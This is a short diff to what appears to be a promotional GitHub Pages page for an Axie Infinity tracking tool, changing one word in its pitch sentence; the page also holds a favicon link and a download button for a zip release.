@@ -1,7 +1,7 @@
 <link rel="shortcut icon" type="image/png" 
       href="{{ "https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-infinity-icon.png?raw=true"  | absolute_url }}">
 
-Are you looking for a new way to keep track of your Axie progress and manage your scholarship? If so, you should consider investing in an Axie Infinity Tracker.
+Are you looking for a new way to keep track of your Axie progress and manage your scholarship? If so, you should consider using an Axie Infinity Tracker.
 
 [![Alt text](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/download-button-plain.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
